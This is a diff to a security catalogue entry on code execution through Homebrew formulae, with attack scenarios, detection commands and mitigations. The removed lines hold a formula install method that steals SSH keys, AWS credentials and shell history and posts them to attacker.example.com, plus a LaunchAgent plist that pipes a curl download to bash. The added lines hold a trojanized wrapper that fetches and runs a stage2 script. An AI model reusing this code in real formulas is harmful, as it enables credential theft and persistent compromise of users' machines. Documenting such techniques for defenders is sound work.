@@ -1,93 +1,67 @@
 ---
-name: "Homebrew Formula Install Method Code Execution"
+name: "Trusted Third-Party Homebrew Formula Code Execution"
 packageManager: "brew"
 slug: "brew-formula-install-ruby"
 category: "Code Execution"
-severity: "critical"
+severity: "high"
 platform:
   - "macOS"
   - "Linux"
-description: "Homebrew formulae are Ruby files that define an `install` method executed by `brew install`. The method has unrestricted access to the filesystem, network, and subprocess execution via Ruby's standard library and helpers like `system`, backticks, and `Utils.safe_popen_read`. Although formulae in homebrew-core pin source tarballs by SHA-256, the Ruby `install` logic itself is not cryptographically bound to a reviewed version — a compromised or malicious tap can ship arbitrary Ruby that runs the moment a user installs the formula."
+description: "Homebrew formulae are Ruby package definitions. Official formula installs normally use signed JSON metadata and reviewed bottles, while non-official taps require explicit trust by default. Loading a trusted third-party formula can execute its Ruby with the user's privileges. Source-build and post-install commands run inside Homebrew's sandbox where supported, which restricts filesystem, network, environment, and credential access. The practical risk is therefore concentrated in formula loading, explicitly trusted third-party code, and any installed program the user later runs."
+descriptionCitations: [1, 2, 3, 4, 5]
 prerequisites:
-  - "Ability to publish or modify a formula in a tap the victim has added (homebrew/core, a third-party tap, or an attacker-owned tap)"
-  - "Victim runs `brew install <formula>` from the affected tap"
-  - "Write access to the tap's git repository — either via a PR merge, compromised maintainer account, or typo-squatted tap name"
+  - "Ability to publish or modify a formula in a non-official tap"
+  - "Victim installs the formula by its fully qualified name, explicitly trusts that formula, or previously trusted the entire tap"
+  - "For a compromise scenario, the affected formula or tap remains trusted when Homebrew later loads the changed Ruby definition"
+prerequisitesCitations: [1, 2, 3, 4, 5]
 attackScenarios:
-  - title: "Malicious install Method Exfiltrating Shell History and SSH Keys"
-    description: "An attacker publishes (or compromises) a formula in a third-party tap. The `install` method runs arbitrary Ruby during `brew install`, archiving sensitive user data and posting it to an attacker-controlled endpoint before completing a normal-looking install so the user sees no error."
+  - title: "Trusted Formula Executes Ruby When Loaded"
+    description: "An attacker publishes or compromises a formula in a non-official tap. Installing its fully qualified name is an explicit trust decision for that formula. When Homebrew loads the trusted definition, Ruby in the formula body can run with the invoking user's privileges, outside the more limited actions of a normal bottled install."
+    citations: [1, 2, 3, 4, 5]
     commands:
-      - label: "Malicious Formula ruby file in a compromised tap"
+      - label: "Illustrative formula with load-time Ruby"
         code: |
           class HelpfulCli < Formula
             desc "A handy developer CLI"
             homepage "https://example.com/helpful-cli"
             url "https://example.com/helpful-cli-1.0.0.tar.gz"
-            sha256 "0000000000000000000000000000000000000000000000000000000000000000"
+            # Illustrative digest; a real formula must match its source archive.
+            sha256 "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
             license "MIT"
 
+            # The class body is evaluated when Homebrew loads this trusted formula.
+            File.write("/tmp/helpful-cli-formula-loaded", Time.now.to_s)
+
             def install
-              # Arbitrary Ruby runs here during `brew install helpful-cli`
-              require "net/http"
-              require "uri"
-              require "base64"
-
-              loot = {
-                "shell_history" => File.read("#{ENV["HOME"]}/.zsh_history") rescue "",
-                "ssh_keys"      => Dir["#{ENV["HOME"]}/.ssh/id_*"].reject { |f| f.end_with?(".pub") }
-                                     .map { |f| [f, File.read(f)] rescue [f, nil] }.to_h,
-                "aws_creds"     => File.read("#{ENV["HOME"]}/.aws/credentials") rescue "",
-                "env"           => ENV.to_h
-              }
-
-              Net::HTTP.post(
-                URI("https://attacker.example.com/c2"),
-                Base64.strict_encode64(Marshal.dump(loot)),
-                "Content-Type" => "application/octet-stream"
-              ) rescue nil
-
-              # Finish the install so the user sees success
               bin.install "helpful-cli"
             end
           end
         language: "ruby"
       - label: "Victim installs from the compromised tap"
         code: |
-          brew tap attacker/devtools
           brew install attacker/devtools/helpful-cli
-          # install method executes — loot is exfiltrated before the binary lands in /opt/homebrew/bin
+          # The fully qualified install trusts only this formula, then loads it.
         language: "bash"
-  - title: "Persistence via LaunchAgent Dropped by install Method"
-    description: "The `install` method writes a user-scoped LaunchAgent plist that re-runs an attacker payload on every login. Because Homebrew formulae commonly write files outside the Cellar (e.g. man pages, shell completions), a single `File.write` looks unremarkable in a code review."
+  - title: "Sandboxed Install Method Places a Trojanized Executable"
+    description: "A source-build `install` method can place attacker-controlled files inside the formula's allowed installation paths. Homebrew's sandbox limits unrelated filesystem and credential access where supported, but it cannot make an intentionally malicious executable safe. The payload runs with the user's privileges when the installed command is invoked."
+    citations: [1, 2, 3, 4, 5]
     commands:
-      - label: "install method dropping a LaunchAgent"
+      - label: "install method placing a wrapper in the formula prefix"
         code: |
           def install
-            agent = "#{ENV["HOME"]}/Library/LaunchAgents/com.apple.cfprefsd.helper.plist"
-            FileUtils.mkdir_p(File.dirname(agent))
-            File.write(agent, <<~PLIST)
-              <?xml version="1.0" encoding="UTF-8"?>
-              <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-              <plist version="1.0">
-              <dict>
-                <key>Label</key><string>com.apple.cfprefsd.helper</string>
-                <key>ProgramArguments</key>
-                <array>
-                  <string>/bin/bash</string>
-                  <string>-c</string>
-                  <string>curl -fsSL https://attacker.example.com/beacon | bash</string>
-                </array>
-                <key>RunAtLoad</key><true/>
-                <key>StartInterval</key><integer>3600</integer>
-              </dict>
-              </plist>
-            PLIST
-            system "launchctl", "load", "-w", agent
-            bin.install "helpful-cli"
+            (bin/"helpful-cli").write <<~SH
+              #!/bin/sh
+              curl -fsSL https://attacker.example.com/stage2 | /bin/sh
+              exec "#{libexec}/helpful-cli.real" "$@"
+            SH
+            chmod 0755, bin/"helpful-cli"
+            libexec.install "helpful-cli" => "helpful-cli.real"
           end
         language: "ruby"
 detection:
   - title: "Audit formula Ruby before installing from third-party taps"
-    description: "Use `brew cat` to dump a formula's Ruby source without installing. Review the `install` method (and any other methods) for network calls, shell execution outside of standard build helpers, and writes outside the Cellar or `bin`/`lib`/`share` prefixes."
+    description: "Use `brew cat` to inspect a formula's Ruby source before installing it. Review the class body as well as `install`, `post_install`, and other methods for unexpected network calls, process execution, or file operations."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - code: |
           brew cat attacker/devtools/helpful-cli
@@ -95,25 +69,28 @@ detection:
         language: "bash"
   - title: "Inspect the tap's git history for unreviewed install-method changes"
     description: "Third-party taps are git repositories cloned under `$(brew --repository)/Library/Taps`. Diff the local clone against upstream to spot install-time changes inserted between user pulls."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - code: |
           cd "$(brew --repository)/Library/Taps/attacker/homebrew-devtools"
           git log --all --oneline -- Formula/helpful-cli.rb
           git diff HEAD~5 -- Formula/helpful-cli.rb
         language: "bash"
-  - title: "Monitor brew install for outbound connections and file writes outside the Cellar"
-    description: "Use macOS's `fs_usage` and Little Snitch / LuLu (or Linux `strace`) to flag formulas whose install methods connect to unexpected hosts or write outside the Homebrew prefix."
+  - title: "Monitor Homebrew for unexpected network and filesystem activity"
+    description: "Use operating-system telemetry to flag unexpected connections or writes by Homebrew. Interpret findings with Homebrew's sandbox and configuration in mind: supported build and post-install steps are restricted where sandboxing is available, while trusted formula Ruby may also run when Homebrew loads the definition."
+    citations: [1, 2, 3, 4, 5]
     commands:
       - code: |
           sudo fs_usage -w -f filesys brew 2>&1 | grep -vE "Cellar|Caskroom|Library/Homebrew|Library/Taps"
         language: "bash"
 mitigation:
   - "Prefer formulae from homebrew/core and homebrew/cask, which require public PR review before merge"
-  - "Audit third-party taps with `brew cat` before install; treat unfamiliar taps as untrusted source code"
+  - "Prefer `brew trust --formula user/repository/formula` over whole-tap trust, and review the formula before granting trust"
   - "Pin the tap to a reviewed commit when reproducibility matters (`git -C $(brew --repository)/Library/Taps/... checkout <sha>`)"
-  - "Run `brew install` as a non-privileged user with no access to SSH keys, AWS credentials, or production secrets"
+  - "Run Homebrew as its intended non-root owning user and keep production secrets out of developer environments"
   - "Use `HOMEBREW_NO_AUTO_UPDATE=1` in CI to prevent pulling unreviewed tap updates mid-build"
   - "Monitor `~/Library/LaunchAgents` and `/Library/LaunchDaemons` for plists created by brew processes"
+mitigationCitations: [1, 2, 3, 4, 5]
 references:
   - title: "Homebrew Formula Cookbook"
     url: "https://docs.brew.sh/Formula-Cookbook"
@@ -121,6 +98,10 @@ references:
     url: "https://docs.brew.sh/Acceptable-Formulae"
   - title: "Formula API Reference"
     url: "https://rubydoc.brew.sh/Formula"
+  - title: "Homebrew Security and Supply Chain"
+    url: "https://docs.brew.sh/Homebrew-Security-and-Supply-Chain"
+  - title: "Homebrew Tap Trust"
+    url: "https://docs.brew.sh/Tap-Trust"
 created: 2026-04-21
-updated: 2026-04-21
+updated: 2026-10-14
 ---
